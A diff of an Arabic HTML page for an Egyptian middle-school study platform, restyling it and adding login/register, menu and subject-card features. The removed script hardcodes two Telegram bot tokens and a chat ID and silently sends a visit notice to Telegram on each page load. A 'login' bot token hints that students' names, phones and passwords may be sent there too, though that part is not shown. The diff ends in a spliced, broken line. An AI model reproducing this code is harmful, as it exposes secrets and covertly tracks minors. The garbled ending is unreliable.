@@ -7,35 +7,39 @@
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
     <style>
         :root {
-            --primary: #2563eb;
-            --primary-dark: #1e40af;
-            --bg-main: #f8fafc;
-            --card-bg: #ffffff;
-            --text-main: #0f172a;
-            --text-muted: #64748b;
-            --border-color: #e2e8f0;
+            --bg-deep: #090d16;
+            --bg-card: #131c31;
+            --bg-input: #1a2644;
+            --primary: #3b82f6;
+            --primary-hover: #60a5fa;
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
+            --border-color: #1e293b;
+            --success: #22c55e;
+            --danger-bg: #450a0a;
+            --danger-text: #fca5a5;
         }
 
         * { box-sizing: border-box; margin: 0; padding: 0; }
         
-        /* منع ظهور أي حاجة في الصفحة نهائياً لحد ما الجافاسكربت يقرر */
-        html { visibility: hidden; }
-
         body {
             font-family: 'Cairo', sans-serif;
-            background-color: var(--bg-main);
+            background-color: var(--bg-deep);
             color: var(--text-main);
             min-height: 100vh;
             display: flex;
             flex-direction: column;
+            background-image: radial-gradient(circle at top right, #1e1b4b 0%, transparent 50%),
+                              radial-gradient(circle at bottom left, #0f172a 0%, transparent 50%);
         }
 
+        /* نافذة تسجيل الدخول / إنشاء حساب */
         .auth-overlay {
             position: fixed;
             top: 0; left: 0;
             width: 100%; height: 100%;
-            background: rgba(15, 23, 42, 0.88);
-            backdrop-filter: blur(8px);
+            background: rgba(5, 8, 15, 0.95);
+            backdrop-filter: blur(12px);
             display: flex; 
             justify-content: center;
             align-items: center;
@@ -44,18 +48,19 @@
         }
 
         .auth-box {
-            background: var(--card-bg);
-            border-top: 5px solid var(--primary);
-            border-radius: 16px;
-            padding: 35px 25px;
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-top: 6px solid var(--primary);
+            border-radius: 20px;
+            padding: 40px 30px;
             width: 100%;
-            max-width: 400px;
+            max-width: 440px;
             text-align: center;
-            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8);
         }
 
         .auth-box h2 {
-            font-size: 1.7rem;
+            font-size: 1.8rem;
             margin-bottom: 8px;
             color: var(--text-main);
             font-weight: 900;
@@ -77,144 +82,440 @@
             display: block;
             margin-bottom: 6px;
             font-size: 0.9rem;
-            color: var(--text-main);
+            color: var(--text-muted);
             font-weight: 700;
         }
 
         .input-group input {
             width: 100%;
-            padding: 12px 16px;
-            border-radius: 10px;
-            background-color: #f1f5f9;
-            border: 2px solid transparent;
+            padding: 13px 16px;
+            border-radius: 12px;
+            background-color: var(--bg-input);
+            border: 2px solid var(--border-color);
             color: var(--text-main);
             font-family: 'Cairo', sans-serif;
             outline: none;
             font-size: 1rem;
             font-weight: 600;
+            transition: all 0.3s;
         }
 
         .input-group input:focus {
-            background-color: #ffffff;
+            background-color: #1e293b;
             border-color: var(--primary);
-            box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.1);
+            box-shadow: 0 0 0 4px rgba(59, 130, 246, 0.2);
         }
 
         .btn-auth {
             width: 100%;
             padding: 14px;
-            background: var(--primary);
+            background: linear-gradient(135deg, var(--primary) 0%, #2563eb 100%);
             border: none;
-            border-radius: 10px;
+            border-radius: 12px;
             color: white;
             font-family: 'Cairo', sans-serif;
             font-size: 1.1rem;
             font-weight: 700;
             cursor: pointer;
             margin-top: 10px;
+            transition: all 0.3s;
         }
 
         .btn-auth:hover {
-            background: var(--primary-dark);
+            background: linear-gradient(135deg, var(--primary-hover) 0%, var(--primary) 100%);
+            transform: translateY(-2px);
         }
 
+        .switch-auth {
+            margin-top: 20px;
+            font-size: 0.9rem;
+            color: var(--text-muted);
+            font-weight: 600;
+        }
+
+        .switch-auth span {
+            color: var(--primary-hover);
+            cursor: pointer;
+            font-weight: 900;
+            text-decoration: underline;
+        }
+
+        /* الشريط العلوي */
         .navbar {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            padding: 18px 30px;
-            background-color: var(--card-bg);
+            padding: 18px 35px;
+            background-color: var(--bg-card);
             border-bottom: 1px solid var(--border-color);
+            box-shadow: 0 4px 6px -1px rgba(0,0,0,0.2);
+            position: relative;
         }
 
         .nav-brand {
-            font-size: 1.3rem;
+            font-size: 1.4rem;
             font-weight: 900;
-            color: var(--primary);
+            background: linear-gradient(135deg, #60a5fa, #06b6d4);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            cursor: pointer;
         }
 
-        .btn-logout {
-            background: #fee2e2;
-            color: #dc2626;
-            border: none;
-            padding: 8px 16px;
-            border-radius: 8px;
-            cursor: pointer;
-            font-family: 'Cairo';
+        .user-panel {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            position: relative;
+        }
+
+        .student-badge {
+            background: rgba(59, 130, 246, 0.15);
+            color: var(--primary-hover);
+            border: 1px solid rgba(59, 130, 246, 0.3);
+            padding: 6px 14px;
+            border-radius: 20px;
             font-weight: 700;
             font-size: 0.9rem;
         }
 
+        /* زر الثلاث نقاط القائمة المنسدلة */
+        .menu-btn {
+            background: var(--bg-input);
+            border: 1px solid var(--border-color);
+            color: var(--text-main);
+            width: 40px; height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.3rem;
+            font-weight: 900;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .menu-btn:hover {
+            background: var(--primary);
+            border-color: var(--primary);
+            transform: scale(1.05);
+        }
+
+        .dropdown-menu {
+            position: absolute;
+            top: 60px; left: 0;
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 14px;
+            width: 230px;
+            box-shadow: 0 15px 30px rgba(0,0,0,0.5);
+            display: none;
+            flex-direction: column;
+            z-index: 999;
+            overflow: hidden;
+            animation: fadeIn 0.2s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .dropdown-item {
+            padding: 12px 18px;
+            color: var(--text-main);
+            text-decoration: none;
+            font-size: 0.95rem;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            border-bottom: 1px solid var(--border-color);
+            transition: background 0.2s;
+            cursor: pointer;
+            background: none;
+            border-left: none; border-right: none; border-top: none;
+            width: 100%;
+            text-align: right;
+        }
+
+        .dropdown-item:last-child {
+            border-bottom: none;
+        }
+
+        .dropdown-item:hover {
+            background: var(--bg-input);
+            color: var(--primary-hover);
+        }
+
+        .dropdown-item.logout {
+            color: var(--danger-text);
+            background: rgba(69, 10, 10, 0.2);
+        }
+
+        .dropdown-item.logout:hover {
+            background: var(--danger-bg);
+            color: white;
+        }
+
+        /* المحتوى الرئيسي */
         .main-container {
-            max-width: 850px;
-            margin: 30px auto;
+            max-width: 1000px;
+            margin: 35px auto;
             padding: 0 20px;
             width: 100%;
+            flex: 1;
         }
 
         .welcome-card {
-            background: var(--card-bg);
+            background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%);
             border: 1px solid var(--border-color);
-            border-radius: 16px;
-            padding: 25px;
+            border-radius: 20px;
+            padding: 35px;
             text-align: center;
-            margin-bottom: 20px;
+            margin-bottom: 30px;
+            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.4);
         }
 
         .welcome-card h3 {
             color: var(--text-main);
-            font-size: 1.5rem;
+            font-size: 2rem;
             font-weight: 900;
+            margin-bottom: 10px;
         }
 
         .welcome-card p {
             color: var(--text-muted);
-            font-size: 0.95rem;
-            margin-top: 8px;
+            font-size: 1.1rem;
             font-weight: 600;
         }
 
-        .subject-box {
-            background: var(--card-bg);
+        .section-title {
+            font-size: 1.35rem;
+            font-weight: 900;
+            color: var(--text-main);
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .subjects-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+
+        .subject-card {
+            background: var(--bg-card);
             border: 1px solid var(--border-color);
-            border-radius: 12px;
-            padding: 18px 22px;
-            margin-bottom: 12px;
+            border-radius: 16px;
+            padding: 24px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
+        }
+
+        .subject-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 25px -5px rgba(0, 0, 0, 0.3);
+            border-color: var(--primary);
+        }
+
+        .subject-header {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            font-weight: 700;
+            margin-bottom: 15px;
+        }
+
+        .subject-title {
+            font-size: 1.2rem;
+            font-weight: 900;
             color: var(--text-main);
         }
 
-        .badge {
-            background: #eff6ff;
-            color: var(--primary);
+        .status-badge {
+            background: rgba(34, 197, 94, 0.15);
+            color: var(--success);
+            border: 1px solid rgba(34, 197, 94, 0.3);
             padding: 5px 12px;
             border-radius: 20px;
-            font-size: 0.85rem;
+            font-size: 0.8rem;
             font-weight: 900;
+        }
+
+        .subject-desc {
+            color: var(--text-muted);
+            font-size: 0.9rem;
+            margin-bottom: 20px;
+            font-weight: 600;
+            line-height: 1.6;
+        }
+
+        .subject-btn {
+            width: 100%;
+            padding: 12px;
+            background: rgba(59, 130, 246, 0.15);
+            color: var(--primary-hover);
+            border: 1px solid rgba(59, 130, 246, 0.3);
+            border-radius: 10px;
+            font-family: 'Cairo';
+            font-weight: 700;
+            font-size: 0.95rem;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .subject-btn:hover {
+            background: var(--primary);
+            color: white;
+        }
+
+        /* صفحة أقسام المادة */
+        .content-view {
+            display: none;
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 10px 25px -5px rgba(0,0,0,0.4);
+        }
+
+        .content-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 25px;
+            border-bottom: 2px solid var(--border-color);
+            padding-bottom: 15px;
+        }
+
+        .back-btn {
+            background: var(--bg-input);
+            color: var(--text-main);
+            border: 1px solid var(--border-color);
+            padding: 8px 16px;
+            border-radius: 8px;
+            font-family: 'Cairo';
+            font-weight: 700;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .back-btn:hover { background: #1e293b; }
+
+        .options-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 15px;
+            margin-top: 20px;
+        }
+
+        .option-card {
+            background: var(--bg-input);
+            border: 1px solid var(--border-color);
+            border-radius: 14px;
+            padding: 25px 20px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .option-card:hover {
+            border-color: var(--primary);
+            background: #1e293b;
+            transform: translateY(-3px);
+        }
+
+        .option-card h4 {
+            font-size: 1.15rem;
+            font-weight: 900;
+            color: var(--text-main);
+            margin-bottom: 8px;
+        }
+
+        .option-card p {
+            font-size: 0.88rem;
+            color: var(--text-muted);
+            font-weight: 600;
+        }
+
+        /* عرض عناصر data.json ديناميكياً */
+        .dynamic-items-container {
+            display: none;
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 10px 25px -5px rgba(0,0,0,0.4);
+        }
+
+        .item-card {
+            background: var(--bg-input);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 18px 20px;
+            margin-bottom: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            transition: all 0.2s;
+        }
+
+        .item-card:hover {
+            border-color: var(--primary);
+        }
+
+        .item-info h5 {
+            font-size: 1.1rem;
+            color: var(--text-main);
+            font-weight: 900;
+            margin-bottom: 4px;
+        }
+
+        .item-info span {
+            font-size: 0.85rem;
+            color: var(--text-muted);
+        }
+
+        .item-link-btn {
+            background: var(--primary);
+            color: white;
+            text-decoration: none;
+            padding: 8px 18px;
+            border-radius: 8px;
+            font-weight: 700;
+            font-size: 0.9rem;
+            transition: background 0.2s;
+        }
+
+        .item-link-btn:hover {
+            background: var(--primary-hover);
         }
 
         footer {
             text-align: center;
-            padding: 20px;
+            padding: 25px;
             color: var(--text-muted);
-            font-size: 0.85rem;
+            font-size: 0.9rem;
             margin-top: auto;
             border-top: 1px solid var(--border-color);
-            background: var(--card-bg);
+            background: var(--bg-card);
             font-weight: 600;
         }
     </style>
 </head>
 <body>
 
-    <!-- نافذة تسجيل الدخول -->
-    <div class="auth-overlay" id="authOverlay">
+    <!-- نافذة تسجيل الدخول / إنشاء حساب -->
+    <div class="auth-overlay" id="authOverlay" style="display: none;">
         <div class="auth-box">
-            <h2>تسجيل الدخول 🔑</h2>
-            <p>أدخل بياناتك للمتابعة إلى المنصة التعليمية</p>
+            <h2 id="authTitle">تسجيل الدخول 🔑</h2>
+            <p id="authSubtitle">أدخل بياناتك للمتابعة إلى المنصة التعليمية</p>
+            
             <div class="input-group">
                 <label>الاسم بالكامل:</label>
                 <input type="text" id="authName" placeholder="مثال: علي شعبان">
@@ -227,89 +528,107 @@
                 <label>كلمة المرور:</label>
                 <input type="password" id="authPass" placeholder="••••••••">
             </div>
-            <button class="btn-auth" onclick="submitAuth()">دخول المنصة 🚀</button>
+
+            <button class="btn-auth" id="authBtn" onclick="submitAuth()">دخول المنصة 🚀</button>
+
+            <div class="switch-auth">
+                <span id="switchText" onclick="toggleAuthMode()">ليس لديك حساب؟ إنشاء حساب جديد</span>
+            </div>
         </div>
     </div>
 
+    <!-- الشريط العلوي مع زر القائمة (ثلاث نقاط) -->
     <div class="navbar">
-        <div class="nav-brand">🎓 منصة ملخصات 3 إعدادي</div>
-        <button class="btn-logout" onclick="logout()">خروج 🚪</button>
+        <div class="nav-brand" onclick="goHome()">🎓 منصة ملخصات 3 إعدادي</div>
+        <div class="user-panel">
+            <span class="student-badge" id="studentBadge">زائر</span>
+            
+            <!-- زر الثلاث نقاط -->
+            <div style="position: relative;">
+                <button class="menu-btn" onclick="toggleMenu(event)">⋮</button>
+                
+                <!-- القائمة المنسدلة -->
+                <div class="dropdown-menu" id="dropdownMenu">
+                    <div class="dropdown-item" onclick="showProfile()">👤 الحساب الشخصي</div>
+                    <a href="https://whatsapp.com/channel/0029Vb8wKFtEQIalbkPy1s0D" target="_blank" class="dropdown-item">📢 رابط قناة الواتساب</a>
+                    <button class="dropdown-item logout" onclick="logout()">🚪 تسجيل الخروج</button>
+                </div>
+            </div>
+        </div>
     </div>
 
+    <!-- المحتوى الرئيسي -->
     <div class="main-container">
-        <div class="welcome-card">
-            <h3 id="userWelcome">أهلاً بك يا بطل! 👋</h3>
-            <p>اختر المادة الدراسية لعرض الملخصات والامتحانات التفاعلية</p>
-        </div>
-
-        <div class="subject-box">
-            <span>📚 دراسات اجتماعية</span>
-            <span class="badge">متاح الآن 🔥</span>
-        </div>
-        <div class="subject-box">
-            <span>🧪 علوم</span>
-            <span class="badge">متاح الآن 🔥</span>
-        </div>
-        <div class="subject-box">
-            <span>📖 لغة عربية</span>
-            <span class="badge">متاح الآن 🔥</span>
-        </div>
-        <div class="subject-box">
-            <span>🇬🇧 لغة إنجليزية</span>
-            <span class="badge">متاح الآن 🔥</span>
-        </div>
-        <div class="subject-box">
-            <span>🔢 رياضيات</span>
-            <span class="badge">متاح الآن 🔥</span>
-        </div>
-    </div>
-
-    <footer>جميع الحقوق محفوظة © 2026 | منصة ملخصات 3 إعدادي 🎓</footer>
-
-    <script>
-        const LOGIN_BOT_TOKEN = '8924810221:AAH5ghkK5lyUkuezQlvQM34fBecueELttb0';
-        const LOGIN_CHAT_ID = '5531994675';
-
-        const NOTIF_BOT_TOKEN = '8881340409:AAHzEVxNE02jzovmFuzsI_yljR8UTvrACAE'; 
-        const NOTIF_CHAT_ID = '5531994675';
-
-        // فحص فوري وسريع قبل إظهار أي بكسل للمستخدم
-        const savedName = localStorage.getItem('student_name');
         
-        if (savedName) {
-            // لو مسجل: أخفِ شاشة الدخول تماماً واظهر المنصة من غير أي ومضة
-            document.addEventListener("DOMContentLoaded", function() {
-                document.getElementById('authOverlay').style.display = 'none';
-                document.getElementById('userWelcome').innerText = 'أهلاً بك يا ' + savedName + ' 👋';
-                document.documentElement.style.visibility = 'visible';
-            });
-        } else {
-            // لو مش مسجل: اظهر شاشة تسجيل الدخول فوراً
-            document.addEventListener("DOMContentLoaded", function() {
-                document.getElementById('authOverlay').style.display = 'flex';
-                document.documentElement.style.visibility = 'visible';
-            });
-        }
+        <!-- صفحة اختيار المواد -->
+        <div id="homeView">
+            <div class="welcome-card">
+                <h3 id="userWelcome">أهلاً بك يا بطل! 👋</h3>
+                <p>اختر المادة الدراسية المطلوبة لاستعراض (الملخصات، الكورسات، والامتحانات)</p>
+            </div>
 
-        // إرسال إشعار الزيارة لبوت الإشعارات مرة واحدة
-        window.onload = function() {
-            const now = new Date();
-            const dateStr = now.toLocaleDateString('ar-EG', { year: 'numeric', month: 'long', day: 'numeric' });
-            const timeStr = now.toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+            <div class="section-title">📚 المواد الدراسية المقررة</div>
 
-            const visitMsg = `🌐 تنبيه زيارة للموقع:\n📅 التاريخ: ${dateStr}\n⏰ الوقت: ${timeStr}\n💻 تم فتح الصفحة بواسطة زائر جديد.`;
+            <div class="subjects-grid">
+                <div class="subject-card">
+                    <div>
+                        <div class="subject-header">
+                            <span class="subject-title">دراسات اجتماعية</span>
+                            <span class="status-badge">متاح 🔥</span>
+                        </div>
+                        <p class="subject-desc">تاريخ العصور الحديثة، جغرافيا العالم، وتدريبات المنهج.</p>
+                    </div>
+                    <button class="subject-btn" onclick="openSubject('دراسات اجتماعية')">دخول المادة 📖</button>
+                </div>
 
-            fetch(`https://api.telegram.org/bot${NOTIF_BOT_TOKEN}/sendMessage?chat_id=${NOTIF_CHAT_ID}&text=${encodeURIComponent(visitMsg)}`)
-                .catch(err => console.log(err));
-        };
+                <div class="subject-card">
+                    <div>
+                        <div class="subject-header">
+                            <span class="subject-title">علوم</span>
+                            <span class="status-badge">متاح 🔥</span>
+                        </div>
+                        <p class="subject-desc">التفاعلات الكيميائية، السرعة، التجارب، والمعادلات.</p>
+                    </div>
+                    <button class="subject-btn" onclick="openSubject('علوم')">دخول المادة 📖</button>
+                </div>
 
-        function submitAuth() {
-            const name = document.getElementById('authName').value.trim();
-            const phone = document.getElementById('authPhone').value.trim();
-            const pass = document.getElementById('authPass').value;
+                <div class="subject-card">
+                    <div>
+                        <div class="subject-header">
+                            <span class="subject-title">لغة عربية</span>
+                            <span class="status-badge">متاح 🔥</span>
+                        </div>
+                        <p class="subject-desc">نحو الشهادة الإعدادية، قصة طموح جارية، والنصوص.</p>
+                    </div>
+                    <button class="subject-btn" onclick="openSubject('لغة عربية')">دخول المادة 📖</button>
+                </div>
 
-            if (!name || !phone || !pass) {
-                alert('من فضلك ادخل جميع البيانات (الاسم، الهاتف، وكلمة المرور)!');
+                <div class="subject-card">
+                    <div>
+                        <div class="subject-header">
+                            <span class="subject-title">لغة إنجليزية</span>
+                            <span class="status-badge">متاح 🔥</span>
+                        </div>
+                        <p class="subject-desc">قواعد الوحدات، الكلمات، المحادثات، وبنك الأسئلة.</p>
+                    </div>
+                    <button class="subject-btn" onclick="openSubject('لغة إنجليزية')">دخول المادة 📖</button>
+                </div>
+
+                <div class="subject-card">
+                    <div>
+                        <div class="subject-header">
+                            <span class="subject-title">رياضيات</span>
+                            <span class="status-badge">متاح 🔥</span>
+                        </div>
+                        <p class="subject-desc">الجبر، الهندسة التحليلية، الدائرة، والنظريات الهامة.</p>
+                    </div>
+                    <button class="subject-btn" onclick="openSubject('رياضيات')">دخول المادة 📖</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- صفحة أقسام المادة -->
+        <div class="content-view" id=)!');
                 return;
             }
 
